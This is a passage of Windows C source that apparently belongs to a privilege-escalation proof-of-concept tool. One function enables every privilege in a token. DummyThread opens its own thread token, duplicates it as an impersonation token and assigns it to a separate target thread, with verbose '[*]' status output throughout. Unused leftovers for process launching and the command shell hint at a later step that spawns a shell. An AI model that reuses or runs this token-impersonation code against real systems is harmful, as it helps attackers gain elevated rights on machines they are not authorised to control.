		wprintf(L"[-] GetTokenInformation failed (Err: %d)\n", dwLastError);
		goto cleanup;
	}

	pTokenPrivileges = (TOKEN_PRIVILEGES*)pInfo;

	if (bVerbose)
		wprintf(L"[*] GetTokenInformation() OK\n");

	*lpdwPrivCount = pTokenPrivileges->PrivilegeCount;

	for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++)
	{
		DWORD dwSize = 0;

		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = pTokenPrivileges->Privileges[i].Luid;
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
		{
			wprintf(L"[-] AdjustTokenPrivileges() failed (Err: %d)\n", GetLastError());
			goto cleanup;
		}
	}

	bRet = TRUE;

cleanup:
	if (pTokenPrivileges)
		GlobalFree(pTokenPrivileges);

	return bRet;
}

DWORD WINAPI DummyThread(LPVOID lpParam)
{
	DWORD dwRet = 0;
	DWORD dwPrivCount = -1;
	HANDLE hThread = INVALID_HANDLE_VALUE;
	HANDLE hThreadToken = INVALID_HANDLE_VALUE;
	HANDLE hThreadTokenDup = INVALID_HANDLE_VALUE;

	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	LPWSTR pwszComspec = NULL;
	DWORD dwBufSize = 1024;

	PDUMMYTHREADDATA params;
	params = (PDUMMYTHREADDATA)lpParam;
	
	if (params->bVerbose)
		wprintf(L"[*] Dummy thread called\n");

	if (params->bVerbose)
		wprintf(L"[*] Enabling all privileges...\n");

	hThread = GetCurrentThread();

	if (!OpenThreadToken(hThread, TOKEN_ALL_ACCESS, FALSE, &hThreadToken))
	{
		wprintf(L"[-] OpenThreadToken() failed (Err: %d)\n", GetLastError());
		goto cleanup;
	}

	if (params->bVerbose)
		wprintf(L"[*] OpenThreadToken() OK\n");

	if (!DuplicateTokenEx(hThreadToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hThreadTokenDup))
	{
		wprintf(L"[-] DuplicateTokenEx() failed (Err: %d)\n", GetLastError());
		goto cleanup;
	}

	if (!SetThreadToken(params->hTargetThread, hThreadTokenDup))
	{
		wprintf(L"[-] SetThreadToken() failed (Err: %d)\n", GetLastError());
		goto cleanup;
	}

	dwRet = 1;

cleanup:
	if (pi.hProcess)
		CloseHandle(pi.hProcess);
	if (pi.hThread)
		CloseHandle(pi.hThread);
	if (pwszComspec)
		free(pwszComspec);
	if (hThreadToken)
		CloseHandle(hThreadToken);
	if (hThread)
		CloseHandle(hThread);

	if (params->bVerbose)
		wprintf(L"[*] Dummy thread exited\n");

	return dwRet;
}

